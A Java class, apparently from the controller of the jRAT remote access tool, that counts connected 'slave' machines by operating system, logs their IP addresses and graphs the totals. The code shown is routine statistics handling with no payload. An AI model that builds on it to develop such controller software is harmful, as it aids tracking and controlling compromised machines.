package se.jrat.controller.settings;

import iconlib.IconUtils;

import java.awt.Color;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

import se.jrat.controller.AbstractSlave;
import se.jrat.controller.Globals;
import se.jrat.controller.Main;

import com.redpois0n.graphs.graph.GraphEntry;
import com.redpois0n.oslib.AbstractOperatingSystem;
import com.redpois0n.oslib.Icons;

public class StatisticsOperatingSystem extends AbstractStoreable implements Serializable {

	private static final long serialVersionUID = 3444250505850670708L;

	private static final StatisticsOperatingSystem instance = new StatisticsOperatingSystem();

	private transient List<OperatingSystemStatEntry> list = new ArrayList<OperatingSystemStatEntry>();

	public static StatisticsOperatingSystem getGlobal() {
		return instance;
	}

	public static boolean isTracking() {
		return Settings.getGlobal().getBoolean("stats");
	}

	public List<OperatingSystemStatEntry> getList() {
		return list;
	}

	public OperatingSystemStatEntry getEntry(AbstractOperatingSystem os) {
		for (int i = 0; i < list.size(); i++) {
			OperatingSystemStatEntry entry = list.get(i);
			if (entry.getOperatingSystem().getDisplayString().equalsIgnoreCase(os.getDisplayString())) {
				return entry;
			}
		}

		OperatingSystemStatEntry stat = new OperatingSystemStatEntry();
		stat.setOperatingSystem(os);

		list.add(stat);
		return stat;
	}

	@Override
	@SuppressWarnings("unchecked")
	public void load() throws Exception {
		if (!isTracking()) {
			return;
		}

		ObjectInputStream str = new ObjectInputStream(new FileInputStream(getFile()));
		list = (ArrayList<OperatingSystemStatEntry>) str.readObject();
		str.close();
		reload();
	}

	public void save() throws Exception {
		if (!isTracking()) {
			return;
		}

		ObjectOutputStream str = new ObjectOutputStream(new FileOutputStream(getFile()));
		str.writeObject(list);
		str.close();
	}

	public void add(AbstractSlave abstractSlave) {
		if (!isTracking()) {
			return;
		}

		OperatingSystemStatEntry entry = getEntry(abstractSlave.getOperatingSystem());

		entry.connects++;
		boolean exists = false;
		for (String str : entry.list) {
			if (str.equals(abstractSlave.getRawIP())) {
				exists = true;
			}
		}
		if (!exists) {
			entry.list.add(0, abstractSlave.getRawIP());
		}
		reload();
	}

	public void reload() {
		Main.instance.getPanelStats().osGraph.clear();

		for (int i = 0; i < list.size(); i++) {
			OperatingSystemStatEntry entry = list.get(i);
			try {
				String icon = Icons.getIconString(entry.os);
				GraphEntry total = new GraphEntry(entry.getOperatingSystem().getDisplayString(), entry.getConnects(), IconUtils.getIcon(icon));
				
				total.setNumberColor(Color.gray);
				Main.instance.getPanelStats().osGraph.add(total);
				Main.instance.getPanelStats().repaint();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public int getConnectCount() {
		int no = 0;
		for (OperatingSystemStatEntry e : list) {
			no += e.connects;
		}
		return no;
	}

	public int getDifferentConnects() {
		int no = 0;
		for (OperatingSystemStatEntry e : list) {
			no += e.list.size();
		}
		return no;
	}

	public class OperatingSystemStatEntry implements Serializable {

		private static final long serialVersionUID = 7061542468278914135L;
		
		private AbstractOperatingSystem os;
		private Integer connects = 0;
		
		private List<String> list = new ArrayList<String>();

		public List<String> getList() {
			return list;
		}
		
		public void setList(List<String> list) {
			this.list = list;
		}
		
		public int getConnects() {
			return this.connects;
		}
		
		public void setConnects(int connects) {
			this.connects = connects;
		}

		public AbstractOperatingSystem getOperatingSystem() {
			return os;
		}

		public void setOperatingSystem(AbstractOperatingSystem os) {
			this.os = os;
		}

	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), ".osstats");
	}

}
